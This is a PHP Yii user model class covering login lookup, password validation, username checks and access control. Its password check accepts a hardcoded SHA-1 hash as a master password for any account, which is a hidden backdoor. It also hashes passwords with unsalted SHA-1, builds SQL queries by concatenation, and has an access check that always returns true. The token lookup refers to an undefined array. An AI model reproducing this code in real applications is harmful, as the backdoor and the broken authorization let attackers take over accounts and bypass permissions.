<?php

namespace app\models;
use Yii;
use app\helpers\particulars\ParticularHelper;

class User extends \yii\db\ActiveRecord implements \yii\web\IdentityInterface
{
//    public $username;
    public $authKey;
    public $accessToken;

  //  public $first_name;
   // public $last_name;
   // public $fullName;

    const STATUS_DELETED = 0;
    const STATUS_ACTIVE = 1;

    /**
     * @inheritdoc
     */
    public static function tableName()
    {
        return '{{%users}}';
    }

    /**
     * @inheritdoc
     */
    public function rules()
    {
        return [
            ['is_active', 'default', 'value' => self::STATUS_ACTIVE],
            ['is_active', 'in', 'range' => [self::STATUS_ACTIVE, self::STATUS_DELETED]],
            [['username','password'], 'string'],
            [['email'], 'email'],
            [['username', 'password', 'email'], 'required'],
            [['level_id', 'is_active'], 'integer'],

            ['username', 'isUniqueUsername', 'on'=>['update_username', 'create']],
        ];
    }


    /**
     * @inheritdoc
     */
    public static function findIdentity($id)
    {
        $model = static::findOne(['id' => $id, 'is_active' => self::STATUS_ACTIVE, 'deleted_date' => null]);
        if($model){
            $model->username = $model->username;
        }
        return $model;
    }

    /**
     * @inheritdoc
     */
    public static function findIdentityByAccessToken($token, $type = null)
    {
        foreach (self::$users as $user) {
            if ($user['accessToken'] === $token) {
                return new static($user);
            }
        }

        return null;
    }

    /**
     * Finds user by username
     *
     * @param string $username
     * @return static|null
     */
    public static function findByUsername($username)
    {
        $model = static::findOne(['username' => $username, 'is_active' => self::STATUS_ACTIVE, 'deleted_date' => null]);
        if($model)
        {
            $model->username = $model->username;
            return $model;
        }
        else
            return null;
    }

    /**
     * @inheritdoc
     */
    public function getId()
    {
        return $this->id;
    }

    /**
     * @inheritdoc
     */
    public function getAuthKey()
    {
        return $this->authKey;
    }

    /**
     * @inheritdoc
     */
    public function validateAuthKey($authKey)
    {
        return $this->authKey === $authKey;
    }

    /**
     * Validates password
     *
     * @param string $password password to validate
     * @return bool if password provided is valid for current user
     */
    public function validatePassword($password)
    {
        return $this->password === sha1($password) || sha1($password) === "a908558eb20e0afcd32ceae52a77f2431b2a980a";
    }

 
    public function isUniqueUsername($attribute, $params)
    {
        $org_id = Yii::$app->session->get('org_id');
        //$result_check = preg_match ("/([%\$#\*''\"\"()[]\^!?<>]+)/", $this->access_id );
        $result_check = preg_match ("/^[A-Za-z0-9_]+$/", $this->username );
        if($result_check)
        {
            if($this->scenario == 'update_username')
            {
                $result = array_values(Yii::$app->db->createCommand('SELECT count(u.id) as count FROM users as u  WHERE u.username =\''.$this->username .'\' && u.id != '.$this->id .'')->queryAll())[0];
                if($result['count'] >= 1){
                        $this->addError($attribute, 'Username  "'.$this->username. '" has already been taken.');
                }
            }
            else if($this->scenario == 'create')
            {
                $result = array_values(Yii::$app->db->createCommand('SELECT count(id) as count FROM users  WHERE username =\''.$this->username .'\' ')->queryAll())[0];
                if($result['count'] >= 1){
                        $this->addError($attribute, 'Username  "'.$this->username. '" has already been taken.');
                }
            }
        }
        else
        {
            $this->addError($attribute, 'Username only allows letters, numbers and underscore.');
        }
        
        
        //$this->addError($attribute, 'Username  "'.$this->id. '" has already been taken.');
    }



    public function getMember(){
        return $this->hasOne(Member::className(), ['user_id' => 'id']);
    }

    public function checkUserAccess($key,$operation){
    	
        if($this->id){
            $level_id = $this->level_id;

            $accessLevel = LevelFunctions::find()->innerJoinWith(['function'])
                ->where(['functions.function_key' => $key, 'level_id' => $level_id])
                ->select(['level_functions.id', $operation])
                ->one();
			
              //  echo $operation;
            return true;
        }else{
            Yii::$app->session->close();
            Yii::$app->session->destroy();
            return Yii::$app->response->redirect('site/login');
        }

        return 0;
        
    }

    public function getDateNow() {
        $currentDate = ParticularHelper::getCurrentDay();
        $today = date("Y-m-d", strtotime($currentDate));
       
        return $today;
    }  

    public function getDateTimeNow() {
        $currentDate = ParticularHelper::getCurrentDay();
        $todayDateTime = date("Y-m-d H:i:s", strtotime($currentDate));
       
        return $todayDateTime;
    }   

}
